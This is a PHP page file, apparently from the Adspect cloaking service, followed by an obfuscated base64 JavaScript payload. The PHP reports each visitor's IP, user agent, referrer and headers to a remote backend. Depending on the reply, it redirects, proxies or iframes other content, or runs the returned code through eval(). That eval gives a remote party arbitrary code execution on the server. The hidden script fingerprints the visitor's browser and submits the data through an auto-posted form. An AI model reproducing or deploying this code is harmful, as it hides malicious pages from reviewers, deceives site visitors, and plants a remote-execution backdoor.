<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('a0b2dc52-e8a7-48b7-8657-d76146f7a972', 'redirect', '_', base64_decode('0TE5Ymkh/vEagAa8LZG/RSjkUPE6Y942CE2solcBA88=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html><html><body><script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4MmVkOCgpe3ZhciBfMHg1NzBhZjE9WydjcmVhdGVFbGVtZW50JywndG91Y2hFdmVudCcsJ25vZGVWYWx1ZScsJzgwMjIyMmd4emJuYycsJ3dpbmRvdycsJ2dldFRpbWV6b25lT2Zmc2V0JywndHlwZScsJ2Nsb3N1cmUnLCdlcnJvcnMnLCdub3RpZmljYXRpb25zJywnUE9TVCcsJzMyMjkwODB1akFhWlonLCd0b3N0cmluZycsJzRLaU1vTHcnLCd2YWx1ZScsJ3dlYmdsJywnc3RyaW5naWZ5JywnZ2V0Q29udGV4dCcsJ2xvY2F0aW9uJywnZG9jdW1lbnRFbGVtZW50JywncXVlcnknLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnZG9jdW1lbnQnLCdnZXRQYXJhbWV0ZXInLCdVTk1BU0tFRF9WRU5ET1JfV0VCR0wnLCdkYXRhJywnYXBwZW5kQ2hpbGQnLCd0aW1lem9uZU9mZnNldCcsJzExNDUwaEpSWlRTJywnY3JlYXRlRXZlbnQnLCdvYmplY3QnLCdpbnB1dCcsJ3N1Ym1pdCcsJzI2MjQ5NFpCdUFNYicsJ3B1c2gnLCdub2RlTmFtZScsJ21ldGhvZCcsJzEwNjEzOTBLd1pRRHInLCdwZXJtaXNzaW9ucycsJ21lc3NhZ2UnLCdzY3JlZW4nLCdmdW5jdGlvbicsJ25hbWUnLCd0b1N0cmluZycsJzczOFNRc3pnSScsJ25hdmlnYXRvcicsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnYm9keScsJ2NvbnNvbGUnLCc4aHZyS0xuJywncGVybWlzc2lvbicsJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCc0ODA5MjFDSEVGWGknLCcxNDU4NTUyTmxvaEV6JywnbGVuZ3RoJ107XzB4MmVkOD1mdW5jdGlvbigpe3JldHVybiBfMHg1NzBhZjE7fTtyZXR1cm4gXzB4MmVkOCgpO31mdW5jdGlvbiBfMHgzMWEyKF8weDM2NzE2YSxfMHgzYTk4Mzgpe3ZhciBfMHgyZWQ4MjU9XzB4MmVkOCgpO3JldHVybiBfMHgzMWEyPWZ1bmN0aW9uKF8weDMxYTIxYyxfMHg0MjhkZjApe18weDMxYTIxYz1fMHgzMWEyMWMtMHhiNDt2YXIgXzB4NDhiNDIyPV8weDJlZDgyNVtfMHgzMWEyMWNdO3JldHVybiBfMHg0OGI0MjI7fSxfMHgzMWEyKF8weDM2NzE2YSxfMHgzYTk4MzgpO30oZnVuY3Rpb24oXzB4Mjk2MzNkLF8weDM0ZmI2ZCl7dmFyIF8weDU0Y2RiNj1fMHgzMWEyLF8weDI5MzI2MD1fMHgyOTYzM2QoKTt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDIzYzQ3ZT1wYXJzZUludChfMHg1NGNkYjYoMHhlNikpLzB4MSstcGFyc2VJbnQoXzB4NTRjZGI2KDB4YzgpKS8weDIrcGFyc2VJbnQoXzB4NTRjZGI2KDB4YzMpKS8weDMqKC1wYXJzZUludChfMHg1NGNkYjYoMHhkMikpLzB4NCkrcGFyc2VJbnQoXzB4NTRjZGI2KDB4ZWEpKS8weDUrcGFyc2VJbnQoXzB4NTRjZGI2KDB4ZDApKS8weDYrcGFyc2VJbnQoXzB4NTRjZGI2KDB4YzIpKS8weDcqKHBhcnNlSW50KF8weDU0Y2RiNigweGJmKSkvMHg4KSstcGFyc2VJbnQoXzB4NTRjZGI2KDB4YmEpKS8weDkqKC1wYXJzZUludChfMHg1NGNkYjYoMHhlMSkpLzB4YSk7aWYoXzB4MjNjNDdlPT09XzB4MzRmYjZkKWJyZWFrO2Vsc2UgXzB4MjkzMjYwWydwdXNoJ10oXzB4MjkzMjYwWydzaGlmdCddKCkpO31jYXRjaChfMHg1NzcwMTkpe18weDI5MzI2MFsncHVzaCddKF8weDI5MzI2MFsnc2hpZnQnXSgpKTt9fX0oXzB4MmVkOCwweDQ2NWZhKSwoZnVuY3Rpb24oKXt2YXIgXzB4MWJiMGJlPV8weDMxYTI7ZnVuY3Rpb24gXzB4MTBjZmZlKCl7dmFyIF8weDE5M2Q3MT1fMHgzMWEyO18weDEzZGFjMFtfMHgxOTNkNzEoMHhjZCldPV8weDQ5NjdiMTt2YXIgXzB4M2FjNTUyPWRvY3VtZW50W18weDE5M2Q3MSgweGM1KV0oJ2Zvcm0nKSxfMHg0MWFmNDk9ZG9jdW1lbnRbXzB4MTkzZDcxKDB4YzUpXShfMHgxOTNkNzEoMHhlNCkpO18weDNhYzU1MltfMHgxOTNkNzEoMHhlOSldPV8weDE5M2Q3MSgweGNmKSxfMHgzYWM1NTJbJ2FjdGlvbiddPXdpbmRvd1tfMHgxOTNkNzEoMHhkNyldWydocmVmJ10sXzB4NDFhZjQ5W18weDE5M2Q3MSgweGNiKV09J2hpZGRlbicsXzB4NDFhZjQ5W18weDE5M2Q3MSgweGI4KV09XzB4MTkzZDcxKDB4ZGUpLF8weDQxYWY0OVtfMHgxOTNkNzEoMHhkMyldPUpTT05bXzB4MTkzZDcxKDB4ZDUpXShfMHgxM2RhYzApLF8weDNhYzU1MltfMHgxOTNkNzEoMHhkZildKF8weDQxYWY0OSksZG9jdW1lbnRbXzB4MTkzZDcxKDB4YmQpXVsnYXBwZW5kQ2hpbGQnXShfMHgzYWM1NTIpLF8weDNhYzU1MltfMHgxOTNkNzEoMHhlNSldKCk7fXZhciBfMHg0OTY3YjE9W10sXzB4MTNkYWMwPXt9O3RyeXt2YXIgXzB4NWMwZDg0PWZ1bmN0aW9uKF8weGMzZjQ5YSl7dmFyIF8weDIyNzdlYz1fMHgzMWEyO2lmKF8weDIyNzdlYygweGUzKT09PXR5cGVvZiBfMHhjM2Y0OWEmJm51bGwhPT1fMHhjM2Y0OWEpe3ZhciBfMHgxMTFkNjQ9ZnVuY3Rpb24oXzB4NGY4ODZjKXt2YXIgXzB4NThjNjdlPV8weDIyNzdlYzt0cnl7dmFyIF8weDRlY2UyZD1fMHhjM2Y0OWFbXzB4NGY4ODZjXTtzd2l0Y2godHlwZW9mIF8weDRlY2UyZCl7Y2FzZSdvYmplY3QnOmlmKG51bGw9PT1fMHg0ZWNlMmQpYnJlYWs7Y2FzZSBfMHg1OGM2N2UoMHhiNyk6XzB4NGVjZTJkPV8weDRlY2UyZFtfMHg1OGM2N2UoMHhiOSldKCk7fV8weDE5ZGJmYltfMHg0Zjg4NmNdPV8weDRlY2UyZDt9Y2F0Y2goXzB4NTU4MjhmKXtfMHg0OTY3YjFbXzB4NThjNjdlKDB4ZTcpXShfMHg1NTgyOGZbXzB4NThjNjdlKDB4YjUpXSk7fX0sXzB4MTlkYmZiPXt9LF8weDNiY2ZiZTtmb3IoXzB4M2JjZmJlIGluIF8weGMzZjQ5YSlfMHgxMTFkNjQoXzB4M2JjZmJlKTt0cnl7dmFyIF8weDQxNzM3YT1PYmplY3RbXzB4MjI3N2VjKDB4ZGEpXShfMHhjM2Y0OWEpO2ZvcihfMHgzYmNmYmU9MHgwO18weDNiY2ZiZTxfMHg0MTczN2FbXzB4MjI3N2VjKDB4YzQpXTsrK18weDNiY2ZiZSlfMHgxMTFkNjQoXzB4NDE3MzdhW18weDNiY2ZiZV0pO18weDE5ZGJmYlsnISEnXT1fMHg0MTczN2E7fWNhdGNoKF8weDE2MWJkYSl7XzB4NDk2N2IxW18weDIyNzdlYygweGU3KV0oXzB4MTYxYmRhW18weDIyNzdlYygweGI1KV0pO31yZXR1cm4gXzB4MTlkYmZiO319O18weDEzZGFjMFtfMHgxYmIwYmUoMHhiNildPV8weDVjMGQ4NCh3aW5kb3dbJ3NjcmVlbiddKSxfMHgxM2RhYzBbXzB4MWJiMGJlKDB4YzkpXT1fMHg1YzBkODQod2luZG93KSxfMHgxM2RhYzBbXzB4MWJiMGJlKDB4YmIpXT1fMHg1YzBkODQod2luZG93W18weDFiYjBiZSgweGJiKV0pLF8weDEzZGFjMFtfMHgxYmIwYmUoMHhkNyldPV8weDVjMGQ4NCh3aW5kb3dbXzB4MWJiMGJlKDB4ZDcpXSksXzB4MTNkYWMwW18weDFiYjBiZSgweGJlKV09XzB4NWMwZDg0KHdpbmRvd1tfMHgxYmIwYmUoMHhiZSldKSxfMHgxM2RhYzBbXzB4MWJiMGJlKDB4ZDgpXT1mdW5jdGlvbihfMHhmOGFmZWYpe3ZhciBfMHgxNGFjMTE9XzB4MWJiMGJlO3RyeXt2YXIgXzB4NDA2NTAzPXt9O18weGY4YWZlZj1fMHhmOGFmZWZbJ2F0dHJpYnV0ZXMnXTtmb3IodmFyIF8weDJlZTU5ZCBpbiBfMHhmOGFmZWYpXzB4MmVlNTlkPV8weGY4YWZlZltfMHgyZWU1OWRdLF8weDQwNjUwM1tfMHgyZWU1OWRbXzB4MTRhYzExKDB4ZTgpXV09XzB4MmVlNTlkW18weDE0YWMxMSgweGM3KV07cmV0dXJuIF8weDQwNjUwMzt9Y2F0Y2goXzB4ZTQ5ZWU3KXtfMHg0OTY3YjFbXzB4MTRhYzExKDB4ZTcpXShfMHhlNDllZTdbXzB4MTRhYzExKDB4YjUpXSk7fX0oZG9jdW1lbnRbXzB4MWJiMGJlKDB4ZDgpXSksXzB4MTNkYWMwW18weDFiYjBiZSgweGRiKV09XzB4NWMwZDg0KGRvY3VtZW50KTt0cnl7XzB4MTNkYWMwW18weDFiYjBiZSgweGUwKV09bmV3IERhdGUoKVtfMHgxYmIwYmUoMHhjYSldKCk7fWNhdGNoKF8weDI1ODZkMSl7XzB4NDk2N2IxW18weDFiYjBiZSgweGU3KV0oXzB4MjU4NmQxWydtZXNzYWdlJ10pO310cnl7XzB4MTNkYWMwW18weDFiYjBiZSgweGNjKV09ZnVuY3Rpb24oKXt9W18weDFiYjBiZSgweGI5KV0oKTt9Y2F0Y2goXzB4MjNiNzkyKXtfMHg0OTY3YjFbXzB4MWJiMGJlKDB4ZTcpXShfMHgyM2I3OTJbXzB4MWJiMGJlKDB4YjUpXSk7fXRyeXtfMHgxM2RhYzBbXzB4MWJiMGJlKDB4YzYpXT1kb2N1bWVudFtfMHgxYmIwYmUoMHhlMildKCdUb3VjaEV2ZW50JylbJ3RvU3RyaW5nJ10oKTt9Y2F0Y2goXzB4NTljMzliKXtfMHg0OTY3YjFbXzB4MWJiMGJlKDB4ZTcpXShfMHg1OWMzOWJbXzB4MWJiMGJlKDB4YjUpXSk7fXRyeXtfMHg1YzBkODQ9ZnVuY3Rpb24oKXt9O3ZhciBfMHgyZmZkMGE9MHgwO18weDVjMGQ4NFtfMHgxYmIwYmUoMHhiOSldPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgyZmZkMGEsJyc7fSxjb25zb2xlWydsb2cnXShfMHg1YzBkODQpLF8weDEzZGFjMFtfMHgxYmIwYmUoMHhkMSldPV8weDJmZmQwYTt9Y2F0Y2goXzB4NDc5ZTkwKXtfMHg0OTY3YjFbXzB4MWJiMGJlKDB4ZTcpXShfMHg0NzllOTBbXzB4MWJiMGJlKDB4YjUpXSk7fXdpbmRvd1snbmF2aWdhdG9yJ11bXzB4MWJiMGJlKDB4YjQpXVtfMHgxYmIwYmUoMHhkOSldKHsnbmFtZSc6XzB4MWJiMGJlKDB4Y2UpfSlbJ3RoZW4nXShmdW5jdGlvbihfMHg0MGQ5MzMpe3ZhciBfMHg1MDYwMzc9XzB4MWJiMGJlO18weDEzZGFjMFsncGVybWlzc2lvbnMnXT1bd2luZG93WydOb3RpZmljYXRpb24nXVtfMHg1MDYwMzcoMHhjMCldLF8weDQwZDkzM1snc3RhdGUnXV0sXzB4MTBjZmZlKCk7fSxfMHgxMGNmZmUpO3RyeXt2YXIgXzB4MmI1MjhjPWRvY3VtZW50W18weDFiYjBiZSgweGM1KV0oJ2NhbnZhcycpW18weDFiYjBiZSgweGQ2KV0oXzB4MWJiMGJlKDB4ZDQpKSxfMHg1OWQxZGQ9XzB4MmI1MjhjWydnZXRFeHRlbnNpb24nXShfMHgxYmIwYmUoMHhjMSkpO18weDEzZGFjMFsnd2ViZ2wnXT17J3ZlbmRvcic6XzB4MmI1MjhjW18weDFiYjBiZSgweGRjKV0oXzB4NTlkMWRkW18weDFiYjBiZSgweGRkKV0pLCdyZW5kZXJlcic6XzB4MmI1MjhjWydnZXRQYXJhbWV0ZXInXShfMHg1OWQxZGRbXzB4MWJiMGJlKDB4YmMpXSl9O31jYXRjaChfMHg1MjMxNDEpe18weDQ5NjdiMVtfMHgxYmIwYmUoMHhlNyldKF8weDUyMzE0MVtfMHgxYmIwYmUoMHhiNSldKTt9fWNhdGNoKF8weDMxNzU0YSl7XzB4NDk2N2IxW18weDFiYjBiZSgweGU3KV0oXzB4MzE3NTRhWydtZXNzYWdlJ10pLF8weDEwY2ZmZSgpO319KCkpKTs="></script></body></html><?php exit;